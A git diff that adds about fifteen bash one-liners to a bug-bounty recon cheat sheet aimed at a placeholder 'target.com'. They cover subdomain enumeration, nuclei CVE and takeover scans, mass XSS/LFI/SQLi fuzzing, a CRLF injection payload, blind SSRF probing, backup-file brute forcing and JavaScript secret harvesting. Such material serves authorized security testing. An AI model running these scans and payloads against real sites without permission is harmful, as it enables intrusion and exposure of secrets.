@@ -537,7 +537,7 @@ cat urls.txt | corscanner
 cat urls.txt | nuclei -silent -t exposed-panels/
 ```
 
-### Bonus: ALL-IN-ONE MEGA SCAN 💣 (Subdomain + Alive + CVE Scan + Panels)
+### ALL-IN-ONE MEGA SCAN 💣 (Subdomain + Alive + CVE Scan + Panels)
 ```bash
 subfinder -d target.com | httpx -silent -mc 200 | tee alive.txt | nuclei -silent -t cves/,exposed-panels/
 ```
@@ -601,4 +601,71 @@ subfinder -d target.com | anew subs.txt && cat subs.txt | httpx -silent | hakraw
 ```bash
 subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee tech_scan.txt && cat tech_scan.txt | nuclei -silent -t cves/
 ```
+Here are your automated recon and vulnerability scanning commands, streamlined for efficiency:
+
+### Automated Asset Hunting + JS Analysis + Secret Finder
+```bash
+subfinder -d target.com | httpx -silent -mc 200 | hakrawler -subs -depth 3 -plain | anew urls.txt && cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | tr -d "\r" | gf secrets | tee -a secrets.txt'
+```
+
+### Mass Fuzz Every Parameter with XSS, LFI, SQLi Payloads (Ultimate Param Attacker)
+```bash
+cat urls.txt | gf xss,lfi,sqli | uro | qsreplace FUZZ | ffuf -u FUZZ -w xss.txt,lfi.txt,sqli.txt -fr "FUZZ" | tee param_fuzz.txt
+```
+
+### Subdomain Takeover, DNS Hijack, Misconfig Scan - All In One
+```bash
+subfinder -d target.com | dnsx -a -resp-only -silent | nuclei -silent -t takeovers/,dns/
+```
+
+### Automatic Full Backup File Bruteforcing Across All Hosts (Super Leaks Finder)
+```bash
+subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | httpx -silent -path-list <(curl -s https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/backup.txt) -mc 200 | tee backups_found.txt
+```
+
+### Deep Directory Brute Force (Smart Recursive Finder)
+```bash
+subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | xargs -I{} gobuster dir -u {} -w big_wordlist.txt -t 50 -o gobuster_output.txt
+```
+
+### Blind SSRF Auto-Detection in All Parameters
+```bash
+cat urls.txt | gf ssrf | qsreplace 'http://canarytoken.com' | httpx -silent -mc 200 -fr 'canarytoken'
+```
+
+### Mega Wordlist Generator from Wayback + JS + HTML Comments + Robots.txt + Sitemap.xml
+```bash
+subfinder -d target.com | httpx -silent | anew alive.txt && cat alive.txt | hakrawler -subs -depth 2 | anew urls.txt && cat urls.txt | gf wordlist | anew wordlist.txt
+```
+
+### Full Sitemap & Robots Extraction Across Subdomains
+```bash
+subfinder -d target.com | httpx -silent -path-list <(echo -e "/robots.txt\n/sitemap.xml") -mc 200 | tee robots_sitemaps.txt
+```
+
+### CRLF Injection Full Auto Discovery & Exploit
+```bash
+cat urls.txt | gf crlf | qsreplace '%0d%0aTest-Header: InjectedValue' | httpx -silent -hdrs | tee crlf_vulns.txt
+```
+
+### CSP Analyzer Across All Hosts (Misconfig Finder)
+```bash
+cat alive.txt | httpx -silent -path / -mc 200 -hdrs | grep -i 'content-security-policy' | tee csp_misconfig.txt
+```
+
+### Full JS Endpoint Extraction + Sensitive Function Search (eval, document.write, etc.)
+```bash
+cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | grep -E -o "(http|https)://[^\" ]+" | anew js_endpoints.txt && curl -s {} | egrep -i "(document\.write|eval|innerHTML|fetch|XMLHttpRequest|localStorage|sessionStorage|cookie)" | tee -a sensitive_js.txt'
+```
+
+### Recon + Full Vuln Scan + CORS, Headers, CVE, Misconfig, Secrets — One Command to Rule Them All
+```bash
+subfinder -d target.com | httpx -silent -title -tech-detect -ports 80,443,8080,8443 | tee alive.txt && cat alive.txt | nuclei -silent -t cves/,misconfiguration/,exposures/,default-logins/,panels/ | tee findings.txt && cat alive.txt | hakrawler -subs -depth 3 | anew urls.txt && cat urls.txt | gf xss,sqli,lfi,ssrf | dalfox pipe --skip-bav --only-poc | tee vulns.txt && cat urls.txt | grep '\.js$' | xargs -I{} bash -c 'curl -s {} | tr -d "\r" | gf secrets' | tee secrets_found.txt
+```
+
+### Subdomain Takeover + Open Redirect Chain (Full Passive → Exploit Ready)
+```bash
+subfinder -d target.com | httpx -silent | nuclei -silent -t takeovers/,redirect/ -o takeover_redirects.txt
+```
+
 
